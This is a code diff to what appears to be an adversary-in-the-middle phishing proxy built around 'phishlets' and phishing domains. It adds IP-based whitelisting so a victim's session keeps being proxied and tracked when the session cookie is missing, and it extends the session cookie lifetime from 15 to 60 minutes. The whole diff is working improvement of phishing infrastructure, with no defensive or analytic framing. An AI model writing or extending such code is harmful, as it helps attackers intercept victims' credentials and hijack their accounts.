@@ -36,18 +36,20 @@ const (
 )
 
 type HttpProxy struct {
-	Server      *http.Server
-	Proxy       *goproxy.ProxyHttpServer
-	crt_db      *CertDb
-	cfg         *Config
-	db          *database.Database
-	sniListener net.Listener
-	isRunning   bool
-	sessions    map[string]*Session
-	sids        map[string]int
-	cookieName  string
-	last_sid    int
-	developer   bool
+	Server       *http.Server
+	Proxy        *goproxy.ProxyHttpServer
+	crt_db       *CertDb
+	cfg          *Config
+	db           *database.Database
+	sniListener  net.Listener
+	isRunning    bool
+	sessions     map[string]*Session
+	sids         map[string]int
+	cookieName   string
+	last_sid     int
+	developer    bool
+	ip_whitelist map[string]int64
+	ip_sids      map[string]string
 }
 
 type ProxySession struct {
@@ -59,14 +61,16 @@ type ProxySession struct {
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
-		Proxy:     goproxy.NewProxyHttpServer(),
-		Server:    nil,
-		crt_db:    crt_db,
-		cfg:       cfg,
-		db:        db,
-		isRunning: false,
-		last_sid:  0,
-		developer: developer,
+		Proxy:        goproxy.NewProxyHttpServer(),
+		Server:       nil,
+		crt_db:       crt_db,
+		cfg:          cfg,
+		db:           db,
+		isRunning:    false,
+		last_sid:     0,
+		developer:    developer,
+		ip_whitelist: make(map[string]int64),
+		ip_sids:      make(map[string]string),
 	}
 
 	p.Server = &http.Server{
@@ -124,7 +128,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
 					sc, err := req.Cookie(p.cookieName)
-					if err != nil {
+					if err != nil && !p.isWhitelistedIP(remote_addr) {
 						if !p.cfg.IsSiteHidden(pl_name) {
 							uv := req.URL.Query()
 							vv := uv.Get(p.cfg.verificationParam)
@@ -155,6 +159,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									ps.SessionId = session.Id
 									ps.Created = true
 									ps.Index = sid
+									p.whitelistIP(remote_addr, ps.SessionId)
 									req_ok = true
 								}
 							} else {
@@ -164,10 +169,20 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
-						var ok bool
-						ps.Index, ok = p.sids[sc.Value]
+						var ok bool = false
+						if err == nil {
+							ps.Index, ok = p.sids[sc.Value]
+							if ok {
+								ps.SessionId = sc.Value
+							}
+						} else {
+							ps.SessionId, ok = p.getSessionIdByIP(remote_addr)
+							if ok {
+								ps.Index, ok = p.sids[ps.SessionId]
+							}
+						}
 						if ok {
-							ps.SessionId = sc.Value
+							p.whitelistIP(remote_addr, ps.SessionId)
 							req_ok = true
 						} else {
 							log.Warning("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
@@ -400,8 +415,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						Value:   ps.SessionId,
 						Path:    "/",
 						Domain:  ps.PhishDomain,
-						Expires: time.Now().UTC().Add(15 * time.Minute),
-						MaxAge:  15 * 60,
+						Expires: time.Now().UTC().Add(60 * time.Minute),
+						MaxAge:  60 * 60,
 					}
 				}
 			}
@@ -837,6 +852,28 @@ func (p *HttpProxy) deleteRequestCookie(name string, req *http.Request) {
 		new_cookie := re.ReplaceAllString(cookie, "")
 		req.Header.Set("Cookie", new_cookie)
 	}
+}
+
+func (p *HttpProxy) whitelistIP(ip_addr string, sid string) {
+	log.Debug("whitelistIP: %s %s", ip_addr, sid)
+	p.ip_whitelist[ip_addr] = time.Now().Add(5 * time.Minute).Unix()
+	p.ip_sids[ip_addr] = sid
+}
+
+func (p *HttpProxy) isWhitelistedIP(ip_addr string) bool {
+	log.Debug("isWhitelistIP: %s", ip_addr)
+	ct := time.Now()
+	if ip_t, ok := p.ip_whitelist[ip_addr]; ok {
+		et := time.Unix(ip_t, 0)
+		fmt.Println(ct.Unix(), et.Unix())
+		return ct.Before(et)
+	}
+	return false
+}
+
+func (p *HttpProxy) getSessionIdByIP(ip_addr string) (string, bool) {
+	sid, ok := p.ip_sids[ip_addr]
+	return sid, ok
 }
 
 type dumbResponseWriter struct {
